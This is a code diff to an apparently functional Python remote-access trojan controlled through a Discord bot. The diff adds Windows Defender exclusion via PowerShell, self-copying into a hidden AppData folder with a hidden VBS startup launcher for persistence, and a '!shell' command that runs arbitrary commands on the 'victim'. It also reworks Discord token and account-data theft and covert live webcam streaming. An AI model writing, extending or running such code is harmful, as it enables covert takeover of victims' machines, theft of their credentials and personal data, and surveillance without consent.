@@ -50,23 +50,81 @@ from discord import Embed
 from win32crypt import CryptUnprotectData
 from PIL import Image, ImageTk
 
+def is_admin():
+    """Check if the script is running with administrator privileges"""
+    try:
+        if platform.system() == "Windows":
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        else:
+            # For Unix systems, check if effective user ID is 0 (root)
+            return os.geteuid() == 0
+    except:
+        return False
+
 # Modify the elevated instance handler at the beginning of your script
 if len(sys.argv) > 1 and sys.argv[1] == "--elevated" and len(sys.argv) > 2:
     # This is an elevated instance
     # Get the session ID passed from the original process
     session_id = sys.argv[2]
     
+    # Get the full path of the current script
+    script_path = os.path.abspath(sys.argv[0])
+    
     # Add the script to Windows Defender exclusions
     try:
-        # Get the full path of the current script
-        script_path = os.path.abspath(sys.argv[0])
-        
         # Add the script to Windows Defender exclusions using PowerShell
         command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{script_path}\'"'
         subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     except Exception:
         pass
     
+    # Move to LocalLow location (even when elevated)
+    try:
+        # Get the filename
+        filename = os.path.basename(script_path)
+        
+        # Get the LocalLow path
+        user_profile = os.environ.get('USERPROFILE', '')
+        locallow_path = os.path.join(user_profile, 'AppData', 'LocalLow', 'Microsoft')
+        
+        # Create a subdirectory for better hiding
+        hidden_dir = os.path.join(locallow_path, 'Services')
+        
+        # Create the directory if it doesn't exist
+        os.makedirs(hidden_dir, exist_ok=True)
+        
+        # Set the directory as hidden
+        if platform.system() == "Windows":
+            ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 0x02)
+        
+        # Destination path
+        destination = os.path.join(hidden_dir, filename)
+        
+        # Copy the file to the hidden location
+        shutil.copy2(script_path, destination)
+        
+        # Hide the file
+        if platform.system() == "Windows":
+            ctypes.windll.kernel32.SetFileAttributesW(destination, 0x02)
+        
+        # Create startup launcher
+        if script_path.endswith('.py'):
+            startup_folder = os.path.join(os.environ['APPDATA'], 
+                                         'Microsoft', 'Windows', 'Start Menu', 
+                                         'Programs', 'Startup')
+            
+            # Create a VBS script to launch the hidden Python script
+            vbs_path = os.path.join(startup_folder, "system_service.vbs")
+            with open(vbs_path, 'w') as f:
+                f.write(f'''Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "pythonw.exe ""{destination}""", 0, False''')
+            
+            # Hide the VBS file too
+            if platform.system() == "Windows":
+                ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 0x02)
+    except Exception:
+        pass
+        
     # Create a success marker file to signal back to the original process
     try:
         temp_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()))
@@ -83,6 +141,64 @@ if len(sys.argv) > 1 and sys.argv[1] == "--elevated" and len(sys.argv) > 2:
     except Exception:
         # Silently fail if we can't create the marker
         pass
+else:
+    # This is the normal instance (not elevated)
+    # Hide the current file
+    try:
+        current_file = os.path.abspath(sys.argv[0])
+        if platform.system() == "Windows":
+            ctypes.windll.kernel32.SetFileAttributesW(current_file, 0x02)  # Hide the file
+    except Exception:
+        pass
+    
+    # Always move to AppData\LocalLow\Microsoft without requiring admin
+    try:
+        # Get the full path of the current script
+        script_path = os.path.abspath(sys.argv[0])
+        filename = os.path.basename(script_path)
+        
+        # Get the LocalLow path
+        # First get the user profile directory
+        user_profile = os.environ.get('USERPROFILE', '')
+        locallow_path = os.path.join(user_profile, 'AppData', 'LocalLow', 'Microsoft')
+        
+        # Create a subdirectory for better hiding (optional)
+        hidden_dir = os.path.join(locallow_path, 'Services')
+        
+        # Create the directory if it doesn't exist
+        os.makedirs(hidden_dir, exist_ok=True)
+        
+        # Set the directory as hidden
+        if platform.system() == "Windows":
+            ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 0x02)  # 0x02 is FILE_ATTRIBUTE_HIDDEN
+        
+        # Destination path
+        destination = os.path.join(hidden_dir, filename)
+        
+        # Copy the file to the hidden location
+        shutil.copy2(script_path, destination)
+        
+        # Hide the file
+        if platform.system() == "Windows":
+            ctypes.windll.kernel32.SetFileAttributesW(destination, 0x02)
+        
+        # Create startup launcher
+        if script_path.endswith('.py'):
+            startup_folder = os.path.join(os.environ['APPDATA'], 
+                                         'Microsoft', 'Windows', 'Start Menu', 
+                                         'Programs', 'Startup')
+            
+            # Create a VBS script to launch the hidden Python script
+            vbs_path = os.path.join(startup_folder, "system_service.vbs")
+            with open(vbs_path, 'w') as f:
+                f.write(f'''Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "pythonw.exe ""{destination}""", 0, False''')
+            
+            # Hide the VBS file too
+            if platform.system() == "Windows":
+                ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 0x02)
+    except Exception:
+        pass
 
 # Immediately hide console window at startup
 if platform.system() == "Windows":
@@ -93,7 +209,6 @@ if platform.system() == "Windows":
     except Exception as e:
         print(f"Error hiding console: {str(e)}")
 
-# Function definitions for hiding console and relaunching
 # Function definitions for hiding console and relaunching
 def hide_console_window():
     """Hide the console window on Windows"""
@@ -771,6 +886,12 @@ async def help_command(ctx):
     )
     
     embed.add_field(
+       name=f"{PREFIX}shell",
+       value="Executes a shell command on the victim and returns the output",
+       inline=False
+    )
+    
+    embed.add_field(
        name=f"{PREFIX}chat",
        value="Opens a chat where you can then talk to the victim",
        inline=False
@@ -944,42 +1065,48 @@ async def grab_token(ctx):
         tokens_data = grab_discord.initialize(raw_data=True)
         
         if tokens_data:
-            # Create a file with the found tokens
-            temp_file = f'tokens_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
-            with open(temp_file, 'w', encoding='utf-8') as f:
-                f.write(f"Discord Tokens found on {SYSTEM_NAME} ({SYSTEM_IP})\n")
-                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+            # Use tempfile module to create a temporary file
+            import tempfile
+            
+            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8') as temp:
+                temp_file = temp.name
+                temp.write(f"Discord Tokens found on {SYSTEM_NAME} ({SYSTEM_IP})\n")
+                temp.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                 
                 for token_json in tokens_data:
                     token_data = json.loads(token_json)
-                    f.write(f"Username: {token_data['username']}\n")
-                    f.write(f"Token: {token_data['token']}\n")
-                    f.write(f"Nitro: {token_data['nitro']}\n")
-                    f.write(f"Billing: {token_data['billing']}\n")
-                    f.write(f"MFA: {token_data['mfa']}\n")
-                    f.write(f"Email: {token_data['email']}\n")
-                    f.write(f"Phone: {token_data['phone']}\n")
+                    temp.write(f"Username: {token_data['username']}\n")
+                    temp.write(f"Token: {token_data['token']}\n")
+                    temp.write(f"Nitro: {token_data['nitro']}\n")
+                    temp.write(f"Billing: {token_data['billing']}\n")
+                    temp.write(f"MFA: {token_data['mfa']}\n")
+                    temp.write(f"Email: {token_data['email']}\n")
+                    temp.write(f"Phone: {token_data['phone']}\n")
                     
                     if token_data['hq_guilds']:
-                        f.write(f"HQ Guilds: {token_data['hq_guilds']}\n")
+                        temp.write(f"HQ Guilds: {token_data['hq_guilds']}\n")
                     
                     if token_data['gift_codes']:
-                        f.write(f"Gift Codes: {token_data['gift_codes']}\n")
+                        temp.write(f"Gift Codes: {token_data['gift_codes']}\n")
                     
-                    f.write("\n" + "-"*50 + "\n\n")
+                    temp.write("\n" + "-"*50 + "\n\n")
             
-            # Send the file
-            await ctx.send(f"🔑 Found {len(tokens_data)} Discord token(s) on {SYSTEM_NAME}:", 
-                          file=discord.File(temp_file))
-            
-            # Clean up the file
-            os.remove(temp_file)
-            
-            # Also send rich embeds for better visualization
-            for token_json in tokens_data:
-                token_data = json.loads(token_json)
-                embed = create_token_embed(token_data)
-                await ctx.send(embed=embed)
+            try:
+                # Send the file
+                await ctx.send(f"🔑 Found {len(tokens_data)} Discord token(s) on {SYSTEM_NAME}:",
+                               file=discord.File(temp_file))
+                
+                # Also send rich embeds for better visualization
+                for token_json in tokens_data:
+                    token_data = json.loads(token_json)
+                    embed = create_token_embed(token_data)
+                    await ctx.send(embed=embed)
+            finally:
+                # Clean up the file - ensure this happens even if sending fails
+                try:
+                    os.remove(temp_file)
+                except:
+                    pass
         else:
             await ctx.send(f"❌ No Discord tokens found on {SYSTEM_NAME}")
     
@@ -991,7 +1118,7 @@ async def grab_token(ctx):
 
 def create_token_embed(token_data):
     """Create a Discord embed for token data visualization"""
-    embed = Embed(title=f"{token_data['username']}", color=0x0084ff)
+    embed = discord.Embed(title=f"{token_data['username']}", color=0x0084ff)
     
     # Add token information
     embed.add_field(name="📜 Token:", value=f"```{token_data['token']}```\n\u200b", inline=False)
@@ -1221,7 +1348,7 @@ class fetch_tokens:
                     codes = '\n\n'.join(code_list)
             
             if not raw_data:
-                embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
+                embed = discord.Embed(title=f"{username} ({user_id})", color=0x0084ff)
                 embed.set_thumbnail(url=avatar)
                 embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
                 embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
@@ -1800,6 +1927,65 @@ def grab_passwords():
         pass
         
     return result
+
+@bot.command(name='shell', help='Execute a shell command on the remote system')
+async def remote_shell(ctx, *, command=None):
+    """Executes a shell command on the remote system and returns the output"""
+    if command is None:
+        await ctx.send("❌ Please provide a command to execute. Example: `!shell whoami`")
+        return
+        
+    try:
+        # Send acknowledgment that command was received
+        await ctx.send(f"🖥️ Executing command on {SYSTEM_NAME}: `{command}`")
+        
+        # Create a subprocess to run the command
+        process = subprocess.Popen(
+            command,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
+        )
+        
+        # Set a timeout for the command execution (30 seconds)
+        try:
+            stdout, stderr = process.communicate(timeout=30)
+        except subprocess.TimeoutExpired:
+            process.kill()
+            await ctx.send("⏱️ Command timed out after 30 seconds")
+            return
+        
+        # Get the return code
+        return_code = process.returncode
+        
+        # Prepare the output message
+        output = f"**Command:** `{command}`\n**Exit Code:** {return_code}\n\n"
+        
+        # Add stdout if there is any
+        if stdout:
+            # Limit output to avoid Discord's message length limits
+            if len(stdout) > 1900:
+                stdout = stdout[:1900] + "... (output truncated)"
+            output += f"**Standard Output:**\n```\n{stdout}\n```\n"
+        
+        # Add stderr if there is any
+        if stderr:
+            # Limit output to avoid Discord's message length limits
+            if len(stderr) > 1900:
+                stderr = stderr[:1900] + "... (output truncated)"
+            output += f"**Standard Error:**\n```\n{stderr}\n```"
+        
+        # If there's no output at all
+        if not stdout and not stderr:
+            output += "*(No output)*"
+        
+        # Send the output
+        await ctx.send(output)
+        
+    except Exception as e:
+        await ctx.send(f"❌ Error executing command: {str(e)}")
 
 @bot.command(name='media', help='Plays a media file on the target system')
 async def play_media(ctx):
@@ -2634,44 +2820,14 @@ async def live_webcam(ctx, duration: int = 30):
             await ctx.send(f"⚠️ Duration must be at least 5 seconds")
             
         # Check if there's already a webcam update task for this channel
-        if ctx.channel.id in screen_update_tasks:  # Reusing the same dictionary for tracking
+        if ctx.channel.id in screen_update_tasks:
             await ctx.send("❌ A screen or webcam sharing session is already active in this channel")
             return
             
         await ctx.send(f"📹 Starting live webcam view from {SYSTEM_NAME} for {duration} seconds...")
-            
-        # Initialize webcam
-        cap = cv2.VideoCapture(0)  # 0 is usually the default webcam
-            
-        if not cap.isOpened():
-            await ctx.send("❌ Error: Could not access webcam.")
-            return
-            
-        # Take initial webcam photo
-        ret, frame = cap.read()
-        if not ret:
-            await ctx.send("❌ Error: Could not capture image from webcam.")
-            cap.release()
-            return
-            
-        # Use system temp directory instead of current directory
-        temp_dir = tempfile.gettempdir()
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        webcam_path = os.path.join(temp_dir, f'webcam_{timestamp}.jpg')
-        cv2.imwrite(webcam_path, frame)
-            
-        # Send the initial webcam image
-        webcam_message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - updating every 0.5 seconds',
-                                  file=discord.File(webcam_path))
-            
-        # Clean up the initial file
-        os.remove(webcam_path)
-            
-        # Release the webcam for now (we'll reopen it for each update)
-        cap.release()
-            
-        # Create a task to update the webcam feed
-        update_task = asyncio.create_task(update_webcam(ctx, webcam_message, duration))
+        
+        # Create a task to handle the webcam stream
+        update_task = asyncio.create_task(webcam_stream_handler(ctx, duration))
         screen_update_tasks[ctx.channel.id] = update_task
             
         # Wait for the task to complete
@@ -2685,87 +2841,130 @@ async def live_webcam(ctx, duration: int = 30):
             del screen_update_tasks[ctx.channel.id]
             
         await ctx.send(f"✅ Live webcam view ended after {duration} seconds")
-        
+    
     except Exception as e:
         await ctx.send(f"❌ Error starting live webcam view: {str(e)}")
         # Clean up if an error occurs
         if ctx.channel.id in screen_update_tasks:
             del screen_update_tasks[ctx.channel.id]
-        if 'webcam_path' in locals() and os.path.exists(webcam_path):
-            os.remove(webcam_path)
-        if 'cap' in locals() and cap.isOpened():
-            cap.release()
 
-async def update_webcam(ctx, message, duration):
-    """Updates the webcam message with a new image every 0.5 seconds"""
+async def webcam_stream_handler(ctx, duration):
+    """Handles the webcam stream using message editing for efficiency"""
+    temp_dir = tempfile.gettempdir()
     end_time = time.time() + duration
     update_count = 0
-    temp_dir = tempfile.gettempdir()  # Use system temp directory
+    message = None
+    cap = None
+    current_webcam_path = None
     
-    while time.time() < end_time:
-        try:
-            # Sleep for 0.5 seconds
-            await asyncio.sleep(0.5)
-            
-            # Initialize webcam for this update
+    try:
+        # Initialize webcam in a separate thread to avoid blocking
+        def init_webcam():
+            nonlocal cap
             cap = cv2.VideoCapture(0)
-            if not cap.isOpened():
-                await ctx.send("❌ Error: Lost access to webcam.")
-                break
-                
-            # Take a new webcam photo
+            # Set lower resolution for faster processing
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+            return cap.isOpened()
+        
+        # Run webcam initialization in a thread
+        is_opened = await asyncio.get_event_loop().run_in_executor(None, init_webcam)
+        
+        if not is_opened:
+            await ctx.send("❌ Error: Could not access webcam.")
+            return
+        
+        # Function to capture a frame in a separate thread
+        def capture_frame():
             ret, frame = cap.read()
             if not ret:
-                await ctx.send("❌ Error: Could not capture image from webcam.")
-                cap.release()
-                break
+                return None
                 
             # Save the image to temp directory
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             webcam_path = os.path.join(temp_dir, f'webcam_{timestamp}.jpg')
             cv2.imwrite(webcam_path, frame)
+            return webcam_path
+        
+        # Capture first frame and send initial message
+        current_webcam_path = await asyncio.get_event_loop().run_in_executor(None, capture_frame)
+        
+        if not current_webcam_path:
+            await ctx.send("❌ Error: Could not capture image from webcam.")
+            return
             
-            # Release the webcam until next update
-            cap.release()
-            
-            # Update the message with the new webcam image
-            update_count += 1
-            remaining = int(end_time - time.time())
-            
-            # Edit the message with the new attachment
-            new_file = discord.File(webcam_path)
-            await message.edit(content=f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining', 
-                              attachments=[new_file])
-            
-            # Clean up the file after sending
-            os.remove(webcam_path)
-            
-        except discord.HTTPException as e:
-            # Handle Discord rate limits or other HTTP errors
-            if e.status == 429:  # Rate limited
-                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
-                await asyncio.sleep(retry_after)
-            else:
-                # For other HTTP errors, try deleting and resending instead
-                try:
-                    await message.delete()
-                    message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
-                                          file=discord.File(webcam_path))
-                except Exception as inner_e:
-                    print(f"Error resending webcam image: {str(inner_e)}")
-                    await asyncio.sleep(2)
-        except Exception as e:
-            # Log the error but continue the loop
-            print(f"Error updating webcam: {str(e)}")
+        message = await ctx.send(
+            f'📹 Live webcam from {SYSTEM_NAME} - starting stream...',
+            file=discord.File(current_webcam_path)
+        )
+        
+        # Main update loop
+        update_interval = 1.0  # Start with 1 second interval
+        
+        while time.time() < end_time:
             try:
-                # Try the fallback method of deleting and resending
-                await message.delete()
-                message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
-                                      file=discord.File(webcam_path))
-            except:
-                await asyncio.sleep(1)
+                # Sleep until next update
+                await asyncio.sleep(update_interval)
+                
+                # Clean up previous file
+                if current_webcam_path and os.path.exists(current_webcam_path):
+                    os.remove(current_webcam_path)
+                
+                # Capture new frame in separate thread
+                current_webcam_path = await asyncio.get_event_loop().run_in_executor(None, capture_frame)
+                
+                if not current_webcam_path:
+                    await ctx.send("❌ Error: Could not capture image from webcam.")
+                    break
+                
+                # Update counters
+                update_count += 1
+                remaining = int(end_time - time.time())
+                
+                # Edit the message with the new attachment
+                await message.edit(
+                    content=f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
+                    attachments=[discord.File(current_webcam_path)]
+                )
+                
+                # Adjust update interval based on remaining time
+                # More frequent updates at the beginning, less frequent towards the end
+                if remaining < 10:
+                    update_interval = 2.0  # Slow down at the end
+                else:
+                    update_interval = 1.0  # Normal speed
+                
+            except discord.HTTPException as e:
+                # Handle Discord rate limits
+                if hasattr(e, 'retry_after'):
+                    await asyncio.sleep(e.retry_after)
+                    update_interval = max(update_interval, e.retry_after + 0.5)
+                else:
+                    # For other HTTP errors, wait and continue
+                    await asyncio.sleep(2)
+                    update_interval = max(update_interval, 2.0)
             
-    return update_count
+            except Exception as e:
+                print(f"Error updating webcam: {str(e)}")
+                await asyncio.sleep(1)
+    
+    finally:
+        # Clean up resources
+        if cap is not None and cap.isOpened():
+            # Release webcam in a thread to avoid blocking
+            await asyncio.get_event_loop().run_in_executor(None, cap.release)
+        
+        # Clean up the last temporary file
+        if current_webcam_path and os.path.exists(current_webcam_path):
+            os.remove(current_webcam_path)
+        
+        # Clean up any other temporary files that might have been missed
+        for file in os.listdir(temp_dir):
+            if file.startswith('webcam_') and file.endswith('.jpg'):
+                try:
+                    os.remove(os.path.join(temp_dir, file))
+                except:
+                    pass
 
 @bot.command(name='stopwebcam', help='Stops the live webcam view')
 async def stop_webcam(ctx):
